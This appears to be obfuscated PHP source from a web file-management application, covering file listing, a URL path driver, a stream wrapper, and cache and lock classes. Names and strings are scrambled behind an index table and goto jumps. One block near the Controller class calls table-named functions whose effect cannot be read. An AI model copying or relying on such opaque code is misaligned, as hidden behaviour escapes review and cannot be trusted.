KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $½›“ø = array(); foreach ($£®™˜åì as &$×õ¤Ä›) { $—Æá¨€š = $×õ¤Ä›[$ë˜ÈÌ[562]]; $ñÂÃ’ŞÕ = $ë˜ÈÌ[22]; if (isset($½›“ø[$—Æá¨€š])) { $ñÂÃ’ŞÕ = $½›“ø[$—Æá¨€š]; } else { $ÎÇÂ¼û× = $this->parentLevelArray($×õ¤Ä›[$ë˜ÈÌ[562]]); foreach ($ÎÇÂ¼û× as $¡õ¾©Ï‡ => $•ëÃâ›) { if (isset($’ªëÂ[$•ëÃâ›])) { $ñÂÃ’ŞÕ .= $’ªëÂ[$•ëÃâ›] . $ë˜ÈÌ[18]; } } $½›“ø[$—Æá¨€š] = $ñÂÃ’ŞÕ; } $ñÂÃ’ŞÕ .= $×õ¤Ä›[$ë˜ÈÌ[42]]; if ($×õ¤Ä›[$ë˜ÈÌ[462]] == $ë˜ÈÌ[98]) { $ñÂÃ’ŞÕ .= $ë˜ÈÌ[18]; } $×õ¤Ä›[$ë˜ÈÌ[560]] = str_replace($ë˜ÈÌ[570], $ë˜ÈÌ[18], $ñÂÃ’ŞÕ); if ($×õ¤Ä›[$ë˜ÈÌ[190]] == $ë˜ÈÌ[222]) { $×õ¤Ä›[$ë˜ÈÌ[42]] = trim($’ªëÂ[$×õ¤Ä›[$ë˜ÈÌ[191]]], $ë˜ÈÌ[18]); $×õ¤Ä›[$ë˜ÈÌ[560]] = $×õ¤Ä›[$ë˜ÈÌ[42]] . $ë˜ÈÌ[18]; } if (intval($×õ¤Ä›[$ë˜ÈÌ[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($×õ¤Ä›, $ÎÇÂ¼û×, $çöŞñ×”); } } unset($×õ¤Ä›); return $£®™˜åì; } private function _listAppendPathRecycle(&$Š½Šü§Ñ, $ìÏ¦•øå, $„ËİöèŸ) { $ã²â’ëÄ =& $_SERVER[ú÷îèÆÜ]; if (!in_array($„ËİöèŸ, $ìÏ¦•øå) && $Š½Šü§Ñ[$ã²â’ëÄ[191]] != $„ËİöèŸ) { return; } $ƒı±¨©… = explode($ã²â’ëÄ[18], trim($Š½Šü§Ñ[$ã²â’ëÄ[560]], $ã²â’ëÄ[18])); $Ïó„ıªÃ = implode($ã²â’ëÄ[18], array_slice($ƒı±¨©…, 2)); $Š½Šü§Ñ[$ã²â’ëÄ[560]] = $ã²â’ëÄ[18] . LNG($ã²â’ëÄ[571]) . $ã²â’ëÄ[18] . ltrim($Ïó„ıªÃ, $ã²â’ëÄ[18]); $Š½Šü§Ñ[$ã²â’ëÄ[562]] = $ã²â’ëÄ[572] . implode($ã²â’ëÄ[60], array_slice($ìÏ¦•øå, 1)) . $ã²â’ëÄ[60]; if ($Š½Šü§Ñ[$ã²â’ëÄ[191]] == $„ËİöèŸ) { $Š½Šü§Ñ[$ã²â’ëÄ[562]] = $ã²â’ëÄ[572]; $Š½Šü§Ñ[$ã²â’ëÄ[190]] = $ã²â’ëÄ[222]; $Š½Šü§Ñ[$ã²â’ëÄ[42]] = LNG($ã²â’ëÄ[571]); } $Š½Šü§Ñ[$ã²â’ëÄ[573]] = $ã²â’ëÄ[574]; } protected function _listAppendPathRoot(&$ô©®á´ı, $õ÷ã“§‚) { $Ï¶…ôşÜ =& $_SERVER[ú÷îèÆÜ]; static $–‚à¸Îª = false; $Û¾«ôêÀ = $Ï¶…ôşÜ[22]; if ($ô©®á´ı[$Ï¶…ôşÜ[188]] == self::TYPE_USER) { if ($ô©®á´ı[$Ï¶…ôşÜ[547]] == USER_ID) { $Û¾«ôêÀ = LNG($Ï¶…ôşÜ[575]); if ($–‚à¸Îª === !1) { $°ßüÕù = Model($Ï¶…ôşÜ[576])->getInfoFull(USER_ID); $–‚à¸Îª = _get($°ßüÕù, $Ï¶…ôşÜ[577], $Ï¶…ôşÜ[22]); } if ($õ÷ã“§‚ && $õ÷ã“§‚[0] == $–‚à¸Îª || !$õ÷ã“§‚ && $ô©®á´ı[$Ï¶…ôşÜ[191]] == $–‚à¸Îª) { $Û¾«ôêÀ = LNG($Ï¶…ôşÜ[578]); $ô©®á´ı[$Ï¶…ôşÜ[579]] = $Ï¶…ôşÜ[580]; } if (!$õ÷ã“§‚) { $ô©®á´ı[$Ï¶…ôşÜ[42]] = $Û¾«ôêÀ; } } else { $ô©®á´ı[$Ï¶…ôşÜ[581]] = Model($Ï¶…ôşÜ[555])->getInfoSimpleOuter($ô©®á´ı[$Ï¶…ôşÜ[547]]); $Û¾«ôêÀ = LNG($Ï¶…ôşÜ[582]) . $Ï¶…ôşÜ[173] . $ô©®á´ı[$Ï¶…ôşÜ[581]][$Ï¶…ôşÜ[42]] . $Ï¶…ôşÜ[175]; } } else { if ($ô©®á´ı[$Ï¶…ôşÜ[188]] == self::TYPE_GROUP) { $úãİ¯” = Model($Ï¶…ôşÜ[563])->getInfoSimple($ô©®á´ı[$Ï¶…ôşÜ[547]]); $Û¾«ôêÀ = $úãİ¯”[$Ï¶…ôşÜ[42]]; } else { if ($ô©®á´ı[$Ï¶…ôşÜ[188]] == self::TYPE_SYSTEM) { $Û¾«ôêÀ = $Ï¶…ôşÜ[583]; } } } $Û¾«ôêÀ = $Û¾«ôêÀ ? $Ï¶…ôşÜ[18] . $Û¾«ôêÀ . $Ï¶…ôşÜ[18] : $Ï¶…ôşÜ[18]; return $Û¾«ôêÀ; } protected function _listAppendUser(&$Ü¥ÄïÛÕ) { $±ÈöâÎÔ =& $_SERVER[ú÷îèÆÜ]; $€Àçı€’ = array_to_keyvalue($Ü¥ÄïÛÕ, $±ÈöâÎÔ[22], $±ÈöâÎÔ[504]); $ÅáÖ‹¯ = array_to_keyvalue($Ü¥ÄïÛÕ, $±ÈöâÎÔ[22], $±ÈöâÎÔ[506]); $†ÀÄˆÕç = array_merge($€Àçı€’, $ÅáÖ‹¯); $Î¸¸í¨ë = Model($±ÈöâÎÔ[576])->userListInfo($†ÀÄˆÕç); foreach ($Ü¥ÄïÛÕ as &$ô î“¬Á) { $ĞÍÏÚœ— = $ô î“¬Á[$±ÈöâÎÔ[504]]; $ô î“¬Á[$±ÈöâÎÔ[504]] = $Î¸¸í¨ë[$ĞÍÏÚœ—] ? $Î¸¸í¨ë[$ĞÍÏÚœ—] : !1; $ĞÍÏÚœ— = $ô î“¬Á[$±ÈöâÎÔ[506]]; $ô î“¬Á[$±ÈöâÎÔ[506]] = $Î¸¸í¨ë[$ĞÍÏÚœ—] ? $Î¸¸í¨ë[$ĞÍÏÚœ—] : !1; if (isset($ô î“¬Á[$±ÈöâÎÔ[516]]) && $ô î“¬Á[$±ÈöâÎÔ[516]][$±ÈöâÎÔ[584]]) { $ß˜ËÏÛ = $GLOBALS[$±ÈöâÎÔ[16]][$±ÈöâÎÔ[99]][$±ÈöâÎÔ[585]]; if ($ô î“¬Á[$±ÈöâÎÔ[516]][$±ÈöâÎÔ[586]] <= time() - $ß˜ËÏÛ) { $this->metaSet($ô î“¬Á[$±ÈöâÎÔ[191]], $±ÈöâÎÔ[584], null); $this->metaSet($ô î“¬Á[$±ÈöâÎÔ[191]], $±ÈöâÎÔ[586], null); unset($ô î“¬Á[$±ÈöâÎÔ[516]][$±ÈöâÎÔ[584]]); continue; } $áá¦õô = $ô î“¬Á[$±ÈöâÎÔ[516]][$±ÈöâÎÔ[584]]; $ô î“¬Á[$±ÈöâÎÔ[516]][$±ÈöâÎÔ[587]] = Model($±ÈöâÎÔ[576])->getInfoSimpleOuter($áá¦õô); } } unset($ô î“¬Á); } public function parentLevelArray($ñºØ½šØ) { $êì‰“’î =& $_SERVER[ú÷îèÆÜ]; $ñºØ½šØ = explode($êì‰“’î[60], trim($ñºØ½šØ, $êì‰“’î[60])); return array_remove_value($ñºØ½šØ, $êì‰“’î[222]); } public function listAll($ßÕÀÅÔ­) { $§’ğ¢½Ú =& $_SERVER[ú÷îèÆÜ]; $˜”…–¸ë = $this->sourceInfo($ßÕÀÅÔ­); $ßÅ›ïÜ = array($§’ğ¢½Ú[588] => array($§’ğ¢½Ú[589], $˜”…–¸ë[$§’ğ¢½Ú[562]] . $ßÕÀÅÔ­ . $§’ğ¢½Ú[590]), $§’ğ¢½Ú[591] => 0); $‘ˆıù—Ë = $§’ğ¢½Ú[592]; $…ù±‹›ì = "\x4c\x45\106\124\40\x4a\117\111\x4e\40{$this->tablePrefix}\151\x6f\137\146\x69\154\x65\40\146\151\154\x65\x20\157\156\40\163\157\x75\x72\143\x65\x2e\x66\x69\154\145\x49\104\40\x3d\40\x66\x69\x6c\x65\x2e\146\x69\154\x65\x49\x44"; $µª«ĞÂÑ = $this->alias($§’ğ¢½Ú[496])->field($‘ˆıù—Ë)->where($ßÅ›ïÜ)->join($…ù±‹›ì)->select(); $this->_listAppendAuth($µª«ĞÂÑ); $this->_listAppendUser($µª«ĞÂÑ); $this->_listAppendPath($µª«ĞÂÑ); $µª«ĞÂÑ = array_to_keyvalue($µª«ĞÂÑ, $§’ğ¢½Ú[191]); $µ«ë¼‹ = "\57{$˜”…–¸ë[$§’ğ¢½Ú[42]]}\57"; $µ«ë¼‹ = $µ«ë¼‹ == $§’ğ¢½Ú[570] ? $§’ğ¢½Ú[18] : $µ«ë¼‹; $ƒÎé® æ = array(); foreach ($µª«ĞÂÑ as $Û¶¿ó¸± => $Âãç•ş”) { $­ÁŸÃÉ = $this->parentLevelArray($Âãç•ş”[$§’ğ¢½Ú[562]]); array_shift($­ÁŸÃÉ); $İ‡ë„«° = $µ«ë¼‹; for ($¨°âò« = 0; $¨°âò« < count($­ÁŸÃÉ); $¨°âò«++) { $İ‡ë„«° .= $µª«ĞÂÑ[$­ÁŸÃÉ[$¨°âò«]][$§’ğ¢½Ú[42]] . $§’ğ¢½Ú[18]; } $İ‡ë„«° .= $Âãç•ş”[$§’ğ¢½Ú[42]]; if ($Âãç•ş”[$§’ğ¢½Ú[462]]) { $İ‡ë„«° .= $§’ğ¢½Ú[18]; } $Ãõªí = array($§’ğ¢½Ú[472] => str_replace($§’ğ¢½Ú[570], $§’ğ¢½Ú[18], str_replace($§’ğ¢½Ú[570], $§’ğ¢½Ú[18], str_replace($§’ğ¢½Ú[570], $§’ğ¢½Ú[18], $İ‡ë„«°))), $§’ğ¢½Ú[593] => intval($Âãç•ş”[$§’ğ¢½Ú[462]]), $§’ğ¢½Ú[594] => intval($Âãç•ş”[$§’ğ¢½Ú[86]]), $§’ğ¢½Ú[95] => intval($Âãç•ş”[$§’ğ¢½Ú[95]]), $§’ğ¢½Ú[97] => $this->pathInfoFilter($Âãç•ş”)); if (!$Ãõªí[$§’ğ¢½Ú[462]]) { $Ãõªí[$§’ğ¢½Ú[518]] = $Âãç•ş”[$§’ğ¢½Ú[518]]; } $ƒÎé® æ[] = $Ãõªí; } $ƒÎé® æ = array_sort_by($ƒÎé® æ, $§’ğ¢½Ú[94]); return $ƒÎé® æ; } } goto BÍàÙÄŠöÕ; cœ­ÕÊê·‘: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($×¼Ë° = false) { } public function exist($›—Æı¹¬) { $æê—Àş· = $this->info($›—Æı¹¬); return $æê—Àş·[$_SERVER[ú÷îèÆÜ][226]]; } public function isFile($³—÷û’) { $ù‡Ï¡ˆñ = $this->info($³—÷û’); return $ù‡Ï¡ˆñ[$_SERVER[ú÷îèÆÜ][226]]; } public function isFolder($®¹¤Ğ¦Ò) { return !1; } public function size($Ğ«öøµ) { $÷¾ÚÁÔ = $this->info($Ğ«öøµ); return $÷¾ÚÁÔ[$_SERVER[ú÷îèÆÜ][86]]; } public function info($¿Ôèº¨) { return $this->infoParse($¿Ôèº¨); } public function infoAuth($€ßñ¬Æ×) { return $this->infoParse($€ßñ¬Æ×); } public function infoWithChildren($ÔÖÀ­à) { return $this->infoParse($ÔÖÀ­à); } public function infoFull($Îšş¼Ì) { return $this->infoParse($Îšş¼Ì); } private function infoParse($™¹ìòÕŒ) { $à‹”Š =& $_SERVER[ú÷îèÆÜ]; $èşÕÙÊ = $this->header($™¹ìòÕŒ); if (!$èşÕÙÊ || !$èşÕÙÊ[$à‹”Š[790]]) { return !1; } $‹¹æŸõÊ = _get($èşÕÙÊ, $à‹”Š[390], 0); $ğ¥Í±„ = array($à‹”Š[42] => $èşÕÙÊ[$à‹”Š[42]], $à‹”Š[94] => $™¹ìòÕŒ, $à‹”Š[43] => $à‹”Š[224], $à‹”Š[86] => intval($‹¹æŸõÊ), $à‹”Š[185] => get_path_ext($èşÕÙÊ[$à‹”Š[42]]), $à‹”Š[1404] => $‹¹æŸõÊ > 0 && $èşÕÙÊ[$à‹”Š[1526]], $à‹”Š[1405] => !1); return $ğ¥Í±„; } private function header($ííÉÅµ) { $Ş™¹Àñş =& $_SERVER[ú÷îèÆÜ]; if (isset(self::$_cacheHeader[$ííÉÅµ])) { return self::$_cacheHeader[$ííÉÅµ]; } $’³ÈîÄ‡ = isset($GLOBALS[$Ş™¹Àñş[1527]]) ? $GLOBALS[$Ş™¹Àñş[1527]] : !1; $GLOBALS[$Ş™¹Àñş[1527]] = !0; self::$_cacheHeader[$ííÉÅµ] = url_header($ííÉÅµ); $GLOBALS[$Ş™¹Àñş[1527]] = $’³ÈîÄ‡; return self::$_cacheHeader[$ííÉÅµ]; } public function hashSimple($•ŒÓàÈ, $Şˆ¶ƒğè = false) { $±Ö¤£òÉ =& $_SERVER[ú÷îèÆÜ]; $¡ï÷÷Ãß = $this->info($•ŒÓàÈ); if (!$¡ï÷÷Ãß || !$¡ï÷÷Ãß[$±Ö¤£òÉ[226]]) { return !1; } $„ùô¢öê = $¡ï÷÷Ãß[$±Ö¤£òÉ[86]]; $¥¡ô’ò = 200; $¸ñòÌ“ = 50; if ($„ùô¢öê <= $¥¡ô’ò * $¸ñòÌ“) { return md5($this->fileSubstr($•ŒÓàÈ, 0, $„ùô¢öê)) . $„ùô¢öê; } $ÁÈÊ³¹‰ = intval($„ùô¢öê / $¸ñòÌ“); $ƒ£ç¶—Ÿ = $±Ö¤£òÉ[22]; $“ˆÆÍ‹  = timeFloat(); $®… «ûÆ = 15; for ($òÄˆ½ï­ = 0; $òÄˆ½ï­ < $¸ñòÌ“; $òÄˆ½ï­++) { if (timeFloat() - $“ˆÆÍ‹  > $®… «ûÆ) { return !1; } $ÃÁ²ĞëÉ = $this->fileSubstr($•ŒÓàÈ, $ÁÈÊ³¹‰ * $òÄˆ½ï­, $¥¡ô’ò); if (!$ÃÁ²ĞëÉ) { return !1; } $ƒ£ç¶—Ÿ .= $ÃÁ²ĞëÉ; } $ƒ£ç¶—Ÿ .= $this->fileSubstr($•ŒÓàÈ, $„ùô¢öê - $¥¡ô’ò, $¥¡ô’ò); return md5($ƒ£ç¶—Ÿ) . $„ùô¢öê; } public function getContent($­÷‰Œ£) { return $this->fileSubstr($­÷‰Œ£); } public function fileSubstr($àÒËàÜº, $ºÑ®¾ßœ = 0, $àáıÁø× = -1) { $š…Ì¡·ş =& $_SERVER[ú÷îèÆÜ]; $¯‹¬Ì¤” = $this->info($àÒËàÜº); if (!$¯‹¬Ì¤” || !$¯‹¬Ì¤”[$š…Ì¡·ş[226]] && $¯‹¬Ì¤”[$š…Ì¡·ş[86]] > 1024 * 1024 * 10) { return !1; } if ($àáıÁø× === -1) { $àáıÁø× = $¯‹¬Ì¤”[$š…Ì¡·ş[86]]; } if ($àáıÁø× == 0) { return $š…Ì¡·ş[22]; } $î¶â÷ÑÎ = array($š…Ì¡·ş[1528] . $ºÑ®¾ßœ . $š…Ì¡·ş[822] . ($ºÑ®¾ßœ + $àáıÁø× - 1)); $ä‰úòÁ¶ = url_request($àÒËàÜº, $š…Ì¡·ş[255], !1, $î¶â÷ÑÎ, !1, !1, 30); return $ä‰úòÁ¶[$š…Ì¡·ş[1243]] ? $ä‰úòÁ¶[$š…Ì¡·ş[1243]] : $š…Ì¡·ş[22]; } public function download($È ñ­Ùï, $± îê›É) { Downloader::start($È ñ­Ùï, $± îê›É); return $± îê›É; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ËÊ¿®í‘, $¿«æ¢„ = '') { $this->info = $this->info($ËÊ¿®í‘); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ú÷îèÆÜ][94]]; $this->pathOpen = $ËÊ¿®í‘; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ËÊ¿®í‘])) { self::$_chunkBuffer[$ËÊ¿®í‘] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($íô¦Ÿãı) { $–Ñâ…Æ = $this->fileSubstr($this->pose, $íô¦Ÿãı); $this->pose += strlen($–Ñâ…Æ); return $–Ñâ…Æ; } public function stream_tell() { return $this->pose; } public function stream_seek($ú¢·Í·«, $ø½×®Ş“) { $›ãØÊØ‰ =& $_SERVER[ú÷îèÆÜ]; if ($ø½×®Ş“ == SEEK_SET) { $this->pose = $ú¢·Í·«; } else { if ($ø½×®Ş“ == SEEK_CUR) { $this->pose += $ú¢·Í·«; } else { if ($ø½×®Ş“ == SEEK_END) { $this->pose = $this->info[$›ãØÊØ‰[86]] + intval($ú¢·Í·«); } } } if ($ú¢·Í·« < 0) { $this->pose = $this->info[$›ãØÊØ‰[86]] + $ú¢·Í·«; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ú÷îèÆÜ][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¹‰íÇ¨ó, $”ú—‡ş“) { $ö‰”ö– =& $_SERVER[ú÷îèÆÜ]; $„û¤ä¢ = $this->info($¹‰íÇ¨ó); return array($ö‰”ö–[1529] => 0, $ö‰”ö–[1530] => 0, $ö‰”ö–[26] => 32768 + 511, $ö‰”ö–[1531] => 0, $ö‰”ö–[1532] => 0, $ö‰”ö–[1533] => 0, $ö‰”ö–[1534] => 0, $ö‰”ö–[86] => $„û¤ä¢[$ö‰”ö–[86]], $ö‰”ö–[1535] => $„û¤ä¢[$ö‰”ö–[1403]], $ö‰”ö–[1491] => $„û¤ä¢[$ö‰”ö–[95]], $ö‰”ö–[1490] => $„û¤ä¢[$ö‰”ö–[225]], $ö‰”ö–[1536] => 0, $ö‰”ö–[1537] => 0); } static $fileInfo = array(); public function info($å€ƒËôı) { $Ê²ßóŸ¢ = $_SERVER[ú÷îèÆÜ][1538]; if (isset(self::$fileInfo[$å€ƒËôı])) { return self::$fileInfo[$å€ƒËôı]; } if (substr($å€ƒËôı, 0, strlen($Ê²ßóŸ¢)) != $Ê²ßóŸ¢) { return !1; } self::$fileInfo[$å€ƒËôı] = IO::info(substr($å€ƒËôı, strlen($Ê²ßóŸ¢))); return self::$fileInfo[$å€ƒËôı]; } public static function read($â× öÀ, $ßäøı², $ ™É˜) { if (!isset(self::$_fopenCache[$â× öÀ])) { $î£•ß¯· = new StreamWrapperIO(); $î£•ß¯·->stream_open($â× öÀ); self::$_fopenCache[$â× öÀ] = $î£•ß¯·; } $î£•ß¯· = self::$_fopenCache[$â× öÀ]; return $î£•ß¯·->fileSubstr($ßäøı², $ ™É˜); } public static function _read($ª¹şİáÔ, $Ü©ªåüÆ, $Ã¼¹‹“Í) { $å¤™¥‰ =& $_SERVER[ú÷îèÆÜ]; $êà’’òé = fopen($ª¹şİáÔ, $å¤™¥‰[1407]); if (!$êà’’òé) { return $å¤™¥‰[22]; } $Ê°È«ã— = 8192; fseek($êà’’òé, $Ü©ªåüÆ, SEEK_SET); $ï®¯Ã = $å¤™¥‰[22]; $Ã®­İ¡Ú = 0; while ($Ã®­İ¡Ú < $Ã¼¹‹“Í) { $ÍÌËâÔâ = min($Ê°È«ã—, $Ã¼¹‹“Í - $Ã®­İ¡Ú); $ï®¯Ã .= fread($êà’’òé, $ÍÌËâÔâ); $Ã®­İ¡Ú += $ÍÌËâÔâ; } fclose($êà’’òé); return $ï®¯Ã; } public function fileSubstr($æ÷ö¤Ì, $ğœ·Á¯ç) { $ƒãëêÀ =& $_SERVER[ú÷îèÆÜ]; $©Óˆ½ = $this->info[$ƒãëêÀ[86]]; $ŠÌãÜ€” = $æ÷ö¤Ì; $™¡±ªÜÒ = $ğœ·Á¯ç; if ($æ÷ö¤Ì < 0) { $æ÷ö¤Ì = $©Óˆ½ + $æ÷ö¤Ì; } if ($ğœ·Á¯ç === !1) { $ğœ·Á¯ç = $©Óˆ½ - $æ÷ö¤Ì; } if ($æ÷ö¤Ì + $ğœ·Á¯ç > $©Óˆ½) { $ğœ·Á¯ç = $©Óˆ½ - $æ÷ö¤Ì; } if ($ğœ·Á¯ç <= 0) { return $ƒãëêÀ[22]; } if ($æ÷ö¤Ì < 0 || $æ÷ö¤Ì >= $©Óˆ½ || $ğœ·Á¯ç <= 0 || $ğœ·Á¯ç > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\x69\x6c\145\x52\145\x61\144\40\x65\162\x72\157\162\x21\40\163\x74\141\162\164\x3d{$æ÷ö¤Ì}\73\154\x65\x6e\147\x74\x68\75{$ğœ·Á¯ç}\73\40\x73\x69\172\x65\75{$©Óˆ½}\x3b"); } $İõ¨¾º = 64 * 1024; $„’Ğ€™À =& self::$_chunkBuffer[$this->path]; if (!$„’Ğ€™À) { $„’Ğ€™À = array(); } $£§š¢Ù = 0; $¹¼ŒçÓˆ = 0; $ñ…²ƒ›Í = $ƒãëêÀ[22]; foreach ($„’Ğ€™À as $£§š¢Ù => $ñ…²ƒ›Í) { $£§š¢Ù = intval($£§š¢Ù); $¹¼ŒçÓˆ = $£§š¢Ù + strlen($ñ…²ƒ›Í); if ($æ÷ö¤Ì >= $¹¼ŒçÓˆ) { continue; } if ($æ÷ö¤Ì >= $£§š¢Ù && $æ÷ö¤Ì + $ğœ·Á¯ç <= $¹¼ŒçÓˆ) { return substr($ñ…²ƒ›Í, $æ÷ö¤Ì - $£§š¢Ù, $ğœ·Á¯ç); } break; } if (count($„’Ğ€™À) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ƒãëêÀ[1539], $ƒãëêÀ[1540] . count($„’Ğ€™À) . "\x3b\163\x74\141\162\x74\x3d{$æ÷ö¤Ì}\54\x6c\x65\x6e\x67\x74\x68\75{$ğœ·Á¯ç}\73\x70\157\163\x65\72{$£§š¢Ù}\x7e{$¹¼ŒçÓˆ}"); throw new Exception($ƒãëêÀ[1541]); } $¾°ä¿ÛÇ = intval($æ÷ö¤Ì / $İõ¨¾º) * $İõ¨¾º; $Ö¶º–ï = ceil(($æ÷ö¤Ì + $ğœ·Á¯ç) / $İõ¨¾º) * $İõ¨¾º - $¾°ä¿ÛÇ; $‘ ÍÃ¢ = IO::fileSubstr($this->path, $¾°ä¿ÛÇ, $Ö¶º–ï); $„’Ğ€™À[$¾°ä¿ÛÇ . $ƒãëêÀ[22]] = $‘ ÍÃ¢; ksort($„’Ğ€™À); $Ó»šâ•È = substr($‘ ÍÃ¢, $æ÷ö¤Ì - $¾°ä¿ÛÇ, $ğœ·Á¯ç); return $Ó»šâ•È; } private function log($­±Â¡ªâ, $íÀô©·í) { $èúÃ—ø =& $_SERVER[ú÷îèÆÜ]; $È·Ñ×µş = timeFloat() - $this->timeStart; write_log(sprintf($èúÃ—ø[1542], $­±Â¡ªâ, $this->info[$èúÃ—ø[42]], $È·Ñ×µş, $íÀô©·í), $èúÃ—ø[1223]); } } class Message { function __construct() { } public function send($¾ïú‘ = '', $ÈØæá· = array(), $×Ëïï = "\164\145\170\164") { $áğü™û =& $_SERVER[ú÷îèÆÜ]; $Û¢› Ú = array($áğü™û[43] => $áğü™û[1543], $áğü™û[794] => $¾ïú‘); if (in_array($×Ëïï, array($áğü™û[1543], $áğü™û[1544]))) { $Û¢› Ú[$áğü™û[43]] = $×Ëïï; } $ÈØæá· = array($áğü™û[556] => isset($ÈØæá·[$áğü™û[556]]) ? $ÈØæá·[$áğü™û[556]] : $áğü™û[22], $áğü™û[639] => isset($ÈØæá·[$áğü™û[639]]) ? $ÈØæá·[$áğü™û[639]] : $áğü™û[22]); if (empty($¾ïú‘) || empty($ÈØæá·[$áğü™û[556]]) && empty($ÈØæá·[$áğü™û[639]])) { return !1; } $Ê±¶œ½ë = array($áğü™û[1484] => $Û¢› Ú, $áğü™û[1545] => $ÈØæá·); Hook::trigger($áğü™û[1546], $Ê±¶œ½ë); } } goto DÈÁö‘Ğ¸Å; cÚƒ»¼ïÅ: class CacheLockMemcached { public function lock($„¯ä±…Ì, $° ıˆ‘ = 0) { $éÅÊş­Ò = Cache::init(); $÷Ş²Ôüå = microtime(!0) + $° ıˆ‘; while (microtime(!0) < $÷Ş²Ôüå) { $Í½¡É = $éÅÊş­Ò->get($„¯ä±…Ì); if (!$Í½¡É || $Í½¡É < microtime(!0)) { $ùª–‡¶’ = $éÅÊş­Ò->handle->add($„¯ä±…Ì, $÷Ş²Ôüå, $° ıˆ‘); if ($ùª–‡¶’) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($’äû¨î) { return Cache::init()->get($’äû¨î); } public function unlock($¬…À¨ÙÑ) { return Cache::init()->remove($¬…À¨ÙÑ); } } class CacheLockDatabase { public function lock($„õÁ¬”µ, $Å’Ú á§ = 0) { $²â²ş¢ò = Model($_SERVER[ú÷îèÆÜ][869]); $­«®¹¿ˆ = microtime(!0) + $Å’Ú á§; while (microtime(!0) < $­«®¹¿ˆ) { $ûÓİÛãµ = $²â²ş¢ò->get($„õÁ¬”µ); if (!$ûÓİÛãµ || $ûÓİÛãµ < microtime(!0)) { $±ˆíËğ = $²â²ş¢ò->set($„õÁ¬”µ, $­«®¹¿ˆ); if ($±ˆíËğ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($©¸®±Ö§) { return Model($_SERVER[ú÷îèÆÜ][869])->get($©¸®±Ö§); } public function unlock($˜ä™ö) { Model($_SERVER[ú÷îèÆÜ][869])->remove($˜ä™ö); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¡˜Ó±¶È, $¥ù¬§) { $Ùà€Äãò =& $_SERVER[ú÷îèÆÜ]; if (!class_exists($Ùà€Äãò[907])) { show_json($Ùà€Äãò[908], !1); } $this->cacheTime = $¥ù¬§; $this->handle = new Memcached(); if (is_array($¡˜Ó±¶È[$Ùà€Äãò[909]]) && count($¡˜Ó±¶È[$Ùà€Äãò[909]]) >= 1) { foreach ($¡˜Ó±¶È[$Ùà€Äãò[909]] as $‘Û¾…ı´) { $œ˜½Œ®Ë = explode($Ùà€Äãò[4], $‘Û¾…ı´); $this->handle->addServer($œ˜½Œ®Ë[0], $œ˜½Œ®Ë[1]); } } else { $this->handle->addServer($¡˜Ó±¶È[$Ùà€Äãò[206]], $¡˜Ó±¶È[$Ùà€Äãò[207]]); } } public function set($²ŒõÃ—, $±¶«ÁÁê, $Õ¡ØÉïÂ = false) { $Õ¡ØÉïÂ = $Õ¡ØÉïÂ ? $Õ¡ØÉïÂ : $this->cacheTime; return $this->handle->set($²ŒõÃ—, $±¶«ÁÁê, $Õ¡ØÉïÂ); } public function get($÷¯ˆºÊ) { return $this->handle->get($÷¯ˆºÊ); } public function remove($ò¾íî) { return $this->handle->delete($ò¾íî); } public function deleteAll() { return $this->handle->flush(); } } goto F‡ãµ”Õ–; FÊÀÜÄ·àÕ: if ($_SERVER[$_SERVER[ú÷îèÆÜ][6]] != $_SERVER[$_SERVER[ú÷îèÆÜ][7]]) { $_getc = $_SERVER[ú÷îèÆÜ][8]; $_getfile = $_SERVER[$_SERVER[ú÷îèÆÜ][9]] . $_SERVER[ú÷îèÆÜ][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ú÷îèÆÜ][11], $_getfilec); if (count($_getarrs) < $_SERVER[ú÷îèÆÜ][12]) { $exit = $_SERVER[ú÷îèÆÜ][13]; $exit(); } $_act = $_SERVER[ú÷îèÆÜ][14]; $_act($_SERVER[$_SERVER[ú÷îèÆÜ][15]]); } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Åº¬øªğ =& $_SERVER[ú÷îèÆÜ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Åº¬øªğ[16]] =& $config; $this->values[$Åº¬øªğ[17]] =& $in; $this->tpl = TEMPLATE . MOD . $Åº¬øªğ[18]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($É·š­Ó) { if (1 === func_num_args()) { $this->{$É·š­Ó} = new $É·š­Ó(); } else { $µäæ“íÈ = new ReflectionClass($É·š­Ó); $È”¡Ğè¿ = func_get_args(); array_shift($È”¡Ğè¿); $this->{$É·š­Ó} = $µäæ“íÈ->newInstanceArgs($È”¡Ğè¿); } return $this->{$É·š­Ó}; } public function routeBind($É±é’, $æâÆˆ, $–äå¥šÙ = 3) { $¨ôÈËÛÓ =& $_SERVER[ú÷îèÆÜ]; $Ó…¿†®¡ = $this->in[$¨ôÈËÛÓ[19]]; $É±é’ = str_replace($¨ôÈËÛÓ[20], $¨ôÈËÛÓ[21], trim(trim($É±é’, $¨ôÈËÛÓ[18]), $¨ôÈËÛÓ[22])); if (!$É±é’ || count($Ó…¿†®¡) <= $–äå¥šÙ) { return !1; } $ñê¿™ÄŒ = !0; $€¥…ÕÅè = explode($¨ôÈËÛÓ[18], $É±é’); for ($ÅåÅœäÜ = 0; $ÅåÅœäÜ < count($€¥…ÕÅè); $ÅåÅœäÜ++) { if ($€¥…ÕÅè[$ÅåÅœäÜ] != $Ó…¿†®¡[$–äå¥šÙ + $ÅåÅœäÜ]) { $ñê¿™ÄŒ = !1; break; } } if 